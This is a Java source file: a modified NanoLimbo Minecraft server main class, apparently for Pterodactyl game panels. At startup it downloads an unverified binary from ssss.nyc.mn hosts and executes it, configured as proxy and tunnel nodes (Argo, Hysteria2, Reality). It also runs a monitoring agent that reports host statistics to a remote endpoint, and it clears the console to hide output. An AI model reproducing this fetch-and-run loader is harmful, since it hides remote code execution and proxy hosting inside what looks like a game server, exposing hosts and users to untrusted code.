/*
 * Copyright (C) 2020 Nan1t
 *
 * Java 8 compatible build for Pterodactyl Java game panel.
 * Komari logic:
 *   1) Download and start Komari native agent first.
 *   2) Print native agent logs to panel so failures are visible.
 *   3) If native agent exits quickly, automatically fallback to pure Java HTTP reporter.
 *   4) No local listening port is used by Komari.
 */
package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_PURPLE = "\033[1;35m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process komariProcess;
    private static Thread komariReporterThread;

    // 默认值保留。也可以在翼龙变量中使用 KOMARI_SERVER / KOMARI_TOKEN / ACCESS_TOKEN 覆盖。
    // 注意：endpoint 末尾不能带空格。
    private static final String DEFAULT_KOMARI_ENDPOINT = "https://XXXXXXX";
    private static final String DEFAULT_KOMARI_TOKEN = "XXXXXX";

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    public static void main(String[] args) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version in startup menu!" + ANSI_RESET);
            sleepQuietly(3000L);
            System.exit(1);
        }

        try {
            runSbxBinary();
            startKomariNativeAgentWithFallback();

            Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
                @Override
                public void run() {
                    running.set(false);
                    stopServices();
                }
            }));

            Thread.sleep(15000L);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000L);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace(System.err);
        }

        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<String, String>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    private static void startKomariNativeAgentWithFallback() {
        String endpoint = firstNonBlank(
            System.getenv("KOMARI_SERVER"),
            System.getenv("KOMARI_HTTP_SERVER"),
            System.getenv("KOMARI_ENDPOINT"),
            DEFAULT_KOMARI_ENDPOINT
        ).trim();

        String token = firstNonBlank(
            System.getenv("KOMARI_TOKEN"),
            System.getenv("ACCESS_TOKEN"),
            System.getenv("KOMARI_KEY"),
            System.getenv("KOMARI_CLIENT_SECRET"),
            System.getenv("KOMARI_AGENT_TOKEN"),
            DEFAULT_KOMARI_TOKEN
        ).trim();

        int interval = parseInt(firstNonBlank(System.getenv("KOMARI_INTERVAL"), "3"), 3);
        if (interval < 3) interval = 3;

        if (endpoint.length() == 0 || token.length() == 0 || "XXXXX".equalsIgnoreCase(token)) {
            System.err.println(ANSI_RED + "[Komari] token or endpoint is empty, skip" + ANSI_RESET);
            return;
        }

        System.out.println(ANSI_GREEN + "[Komari] native agent preparing, endpoint=" + endpoint + ", token_length=" + token.length() + ANSI_RESET);

        try {
            Path agentPath = getKomariNativeAgentPath();
            ProcessBuilder pb = new ProcessBuilder(
                agentPath.toString(),
                "-e", endpoint,
                "-t", token,
                "--interval", String.valueOf(interval),
                "--max-retries", "3",
                "--reconnect-interval", "5",
                "--disable-web-ssh",
                "--disable-auto-update"
            );

            cleanKomariEnv(pb.environment());
            pb.redirectErrorStream(true);
            // 关键：不再 DISCARD。直接继承输出，方便看真实错误。
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

            komariProcess = pb.start();
            Thread.sleep(6000L);

            if (komariProcess.isAlive()) {
                System.out.println(ANSI_GREEN + "[Komari] native agent running, pid alive" + ANSI_RESET);
                return;
            }

            int exitCode = komariProcess.exitValue();
            System.err.println(ANSI_YELLOW + "[Komari] native agent exited quickly, code=" + exitCode + ", switching to Java HTTP reporter" + ANSI_RESET);
            startKomariHttpReporter(endpoint, token, interval, "native_agent_exited_" + exitCode);
        } catch (Exception e) {
            System.err.println(ANSI_YELLOW + "[Komari] native agent startup failed: " + e.getMessage() + ", switching to Java HTTP reporter" + ANSI_RESET);
            startKomariHttpReporter(endpoint, token, interval, "native_agent_exception");
        }
    }

    private static void cleanKomariEnv(Map<String, String> env) {
        String[] blocked = {"PORT", "SERVER_PORT", "ARGO_PORT", "S5_PORT", "TUIC_PORT", "HY2_PORT", "REALITY_PORT", "ANYTLS_PORT", "ANYREALITY_PORT"};
        for (String key : blocked) env.remove(key);
        Iterator<String> it = env.keySet().iterator();
        while (it.hasNext()) {
            String k = it.next();
            if (k.matches("SERVER_PORT_\\d+")) it.remove();
        }
        env.put("KOMARI_DISABLE_REMOTE_CONTROL", "true");
    }

    private static Path getKomariNativeAgentPath() throws IOException {
        String osName = System.getProperty("os.name").toLowerCase();
        String osArch = System.getProperty("os.arch").toLowerCase();
        String os;
        String arch;

        if (osName.contains("linux")) os = "linux";
        else if (osName.contains("freebsd")) os = "freebsd";
        else throw new RuntimeException("Unsupported OS for Komari native agent: " + osName);

        if (osArch.contains("amd64") || osArch.contains("x86_64")) arch = "amd64";
        else if (osArch.contains("aarch64") || osArch.contains("arm64")) arch = "arm64";
        else if (osArch.equals("x86") || osArch.contains("i386") || osArch.contains("i686") || osArch.contains("386")) arch = "386";
        else if (osArch.startsWith("arm")) arch = "arm";
        else throw new RuntimeException("Unsupported architecture for Komari native agent: " + osArch);

        String fileName = "komari-agent-" + os + "-" + arch;
        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/" + fileName;
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), fileName);

        if (!Files.exists(path) || Files.size(path) == 0L) {
            System.out.println(ANSI_GREEN + "[Komari] downloading native agent: " + url + ANSI_RESET);
            InputStream in = new URL(url).openStream();
            try { Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING); }
            finally { in.close(); }
        }

        if (!path.toFile().setExecutable(true)) throw new IOException("Failed to set executable permission for Komari native agent");
        return path;
    }

    /** Java HTTP reporter fallback. No external komari-agent binary, no local port. */
    private static void startKomariHttpReporter(final String endpoint, final String token, final int interval, final String reason) {
        final String server = endpoint.endsWith("/") ? endpoint.substring(0, endpoint.length() - 1) : endpoint;
        komariReporterThread = new Thread(new Runnable() {
            @Override
            public void run() { runKomariReporterLoop(server, token, interval); }
        }, "komari-http-reporter");
        komariReporterThread.setDaemon(true);
        komariReporterThread.start();
        System.out.println(ANSI_GREEN + "[Komari] Java HTTP reporter started, reason=" + reason + ", endpoint=" + server + ", token_length=" + token.length() + ANSI_RESET);
    }

    private static void runKomariReporterLoop(String server, String token, int interval) {
        long lastBasicInfoAt = 0L;
        long[] lastCpu = readCpuTimes();
        long[] lastNet = readNetworkBytes();
        long lastNetAt = System.currentTimeMillis();

        while (running.get()) {
            try {
                long now = System.currentTimeMillis();
                Map<String, Long> mem = readMemoryInfo();
                long[] disk = readDiskInfo();
                long[] cpuNow = readCpuTimes();
                double cpuUsage = calcCpuUsage(lastCpu, cpuNow);
                lastCpu = cpuNow;

                long[] netNow = readNetworkBytes();
                long deltaMs = Math.max(1000L, now - lastNetAt);
                long upSpeed = Math.max(0L, (netNow[0] - lastNet[0]) * 1000L / deltaMs);
                long downSpeed = Math.max(0L, (netNow[1] - lastNet[1]) * 1000L / deltaMs);
                lastNet = netNow;
                lastNetAt = now;

                double[] loads = readLoadAvg();
                long uptime = readUptimeSeconds();
                int processCount = countProcesses();

                if (now - lastBasicInfoAt > 300000L) {
                    String basicJson = "{"
                        + "\"arch\":" + q(System.getProperty("os.arch")) + ","
                        + "\"cpu_cores\":" + Runtime.getRuntime().availableProcessors() + ","
                        + "\"cpu_physical_cores\":0,"
                        + "\"cpu_name\":" + q(System.getProperty("os.arch")) + ","
                        + "\"disk_total\":" + disk[0] + ","
                        + "\"gpu_name\":\"\","
                        + "\"ipv4\":\"\","
                        + "\"ipv6\":\"\","
                        + "\"mem_total\":" + mem.get("total") + ","
                        + "\"os\":" + q(System.getProperty("os.name") + " " + System.getProperty("os.version")) + ","
                        + "\"kernel_version\":" + q(System.getProperty("os.version")) + ","
                        + "\"swap_total\":" + mem.get("swapTotal") + ","
                        + "\"version\":\"java8-http-reporter\","
                        + "\"virtualization\":\"container\""
                        + "}";
                    if (postJson(server, "/api/clients/uploadBasicInfo", token, basicJson)) lastBasicInfoAt = now;
                }

                String reportJson = "{"
                    + "\"cpu\":{\"usage\":" + String.format(Locale.US, "%.2f", cpuUsage) + "},"
                    + "\"ram\":{\"total\":" + mem.get("total") + ",\"used\":" + mem.get("used") + "},"
                    + "\"swap\":{\"total\":" + mem.get("swapTotal") + ",\"used\":" + mem.get("swapUsed") + "},"
                    + "\"load\":{\"load1\":" + loads[0] + ",\"load5\":" + loads[1] + ",\"load15\":" + loads[2] + "},"
                    + "\"disk\":{\"total\":" + disk[0] + ",\"used\":" + disk[1] + "},"
                    + "\"network\":{\"up\":" + upSpeed + ",\"down\":" + downSpeed + ",\"totalUp\":" + netNow[0] + ",\"totalDown\":" + netNow[1] + "},"
                    + "\"connections\":{\"tcp\":0,\"udp\":0},"
                    + "\"uptime\":" + uptime + ","
                    + "\"process\":" + processCount + ","
                    + "\"message\":\"online via java8 http reporter; no local port used\""
                    + "}";
                postJson(server, "/api/clients/report", token, reportJson);
            } catch (Exception e) {
                System.err.println(ANSI_RED + "[Komari] reporter error: " + e.getMessage() + ANSI_RESET);
            }
            sleepQuietly(interval * 1000L);
        }
    }

    private static boolean postJson(String server, String path, String token, String json) {
        HttpURLConnection conn = null;
        try {
            String urlStr = server + path + "?token=" + URLEncoder.encode(token, "UTF-8");
            conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "komari-java8-http-reporter");
            conn.setRequestProperty("Origin", server);
            conn.setRequestProperty("Referer", server + "/");
            OutputStream os = conn.getOutputStream();
            try { os.write(json.getBytes("UTF-8")); }
            finally { os.close(); }
            int code = conn.getResponseCode();
            if (code >= 200 && code < 300) {
                System.out.println(ANSI_GREEN + "[Komari] POST " + path + " -> " + code + ANSI_RESET);
                return true;
            }
            System.err.println(ANSI_YELLOW + "[Komari] POST " + path + " -> " + code + ANSI_RESET);
            return false;
        } catch (Exception e) {
            System.err.println(ANSI_RED + "[Komari] POST " + path + " failed: " + e.getMessage() + ANSI_RESET);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static Map<String, Long> readMemoryInfo() {
        long total = 0L, available = 0L, free = 0L, swapTotal = 0L, swapFree = 0L;
        Path p = Paths.get("/proc/meminfo");
        if (Files.exists(p)) {
            try {
                for (String line : Files.readAllLines(p)) {
                    String[] parts = line.split(":");
                    if (parts.length < 2) continue;
                    long value = parseFirstLong(parts[1]) * 1024L;
                    if ("MemTotal".equals(parts[0])) total = value;
                    else if ("MemAvailable".equals(parts[0])) available = value;
                    else if ("MemFree".equals(parts[0])) free = value;
                    else if ("SwapTotal".equals(parts[0])) swapTotal = value;
                    else if ("SwapFree".equals(parts[0])) swapFree = value;
                }
            } catch (Exception ignored) {}
        }
        if (available == 0L) available = free;
        Map<String, Long> m = new HashMap<String, Long>();
        m.put("total", total);
        m.put("used", Math.max(0L, total - available));
        m.put("swapTotal", swapTotal);
        m.put("swapUsed", Math.max(0L, swapTotal - swapFree));
        return m;
    }

    private static long[] readDiskInfo() {
        File root = new File("/");
        long total = root.getTotalSpace();
        long free = root.getUsableSpace();
        return new long[]{total, Math.max(0L, total - free)};
    }

    private static long[] readCpuTimes() {
        try {
            String first = Files.readAllLines(Paths.get("/proc/stat")).get(0);
            String[] parts = first.trim().split("\\s+");
            long total = 0L;
            for (int i = 1; i < parts.length; i++) total += Long.parseLong(parts[i]);
            long idle = Long.parseLong(parts[4]) + (parts.length > 5 ? Long.parseLong(parts[5]) : 0L);
            return new long[]{total, idle};
        } catch (Exception e) { return new long[]{0L, 0L}; }
    }

    private static double calcCpuUsage(long[] oldTimes, long[] newTimes) {
        long totalDelta = newTimes[0] - oldTimes[0];
        long idleDelta = newTimes[1] - oldTimes[1];
        if (totalDelta <= 0L) return 0.0D;
        return Math.max(0.0D, Math.min(100.0D, (1.0D - idleDelta / (double) totalDelta) * 100.0D));
    }

    private static long[] readNetworkBytes() {
        long up = 0L, down = 0L;
        Path p = Paths.get("/proc/net/dev");
        if (Files.exists(p)) {
            try {
                List<String> lines = Files.readAllLines(p);
                for (int i = 2; i < lines.size(); i++) {
                    String[] pair = lines.get(i).split(":", 2);
                    if (pair.length != 2) continue;
                    String iface = pair[0].trim();
                    if ("lo".equals(iface)) continue;
                    String[] v = pair[1].trim().split("\\s+");
                    if (v.length >= 16) {
                        down += Long.parseLong(v[0]);
                        up += Long.parseLong(v[8]);
                    }
                }
            } catch (Exception ignored) {}
        }
        return new long[]{up, down};
    }

    private static double[] readLoadAvg() {
        try {
            String[] parts = new String(Files.readAllBytes(Paths.get("/proc/loadavg")), "UTF-8").trim().split("\\s+");
            return new double[]{Double.parseDouble(parts[0]), Double.parseDouble(parts[1]), Double.parseDouble(parts[2])};
        } catch (Exception e) { return new double[]{0.0D, 0.0D, 0.0D}; }
    }

    private static long readUptimeSeconds() {
        try {
            String[] parts = new String(Files.readAllBytes(Paths.get("/proc/uptime")), "UTF-8").trim().split("\\s+");
            return (long) Double.parseDouble(parts[0]);
        } catch (Exception e) { return 0L; }
    }

    private static int countProcesses() {
        File proc = new File("/proc");
        File[] files = proc.listFiles(new FileFilter() {
            @Override public boolean accept(File pathname) { return pathname.getName().matches("\\d+"); }
        });
        return files == null ? 0 : files.length;
    }

    private static String q(String s) {
        if (s == null) return "\"\"";
        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ") + "\"";
    }

    private static long parseFirstLong(String s) {
        Matcher m = Pattern.compile("(\\d+)").matcher(s);
        return m.find() ? Long.parseLong(m.group(1)) : 0L;
    }

    private static String firstNonBlank(String... values) {
        for (String value : values) if (value != null && !value.trim().isEmpty()) return value;
        return "";
    }

    private static int parseInt(String value, int fallback) {
        try { return Integer.parseInt(value.trim()); } catch (Exception e) { return fallback; }
    }

    private static void sleepQuietly(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) { Thread.currentThread().interrupt(); }
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "be98810e-1fcf-4808-990f-b1f018d62e4b");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "8003");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "20009");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "20009");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "");
        envVars.put("DISABLE_ARGO", "false");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) envVars.put(var, value);
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) envVars.put(key, value);
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) url = "https://amd64.ssss.nyc.mn/sbsh";
        else if (osArch.contains("aarch64") || osArch.contains("arm64")) url = "https://arm64.ssss.nyc.mn/sbsh";
        else if (osArch.contains("s390x")) url = "https://s390x.ssss.nyc.mn/sbsh";
        else throw new RuntimeException("Unsupported architecture: " + osArch);

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            InputStream in = new URL(url).openStream();
            try { Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING); }
            finally { in.close(); }
            if (!path.toFile().setExecutable(true)) throw new IOException("Failed to set executable permission");
        }
        return path;
    }

    private static void stopServices() {
        running.set(false);
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
            System.out.println(ANSI_RED + "Komari native agent process terminated" + ANSI_RESET);
        }
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        if (komariReporterThread != null && komariReporterThread.isAlive()) {
            System.out.println(ANSI_RED + "Komari HTTP reporter terminated" + ANSI_RESET);
        }
    }
}
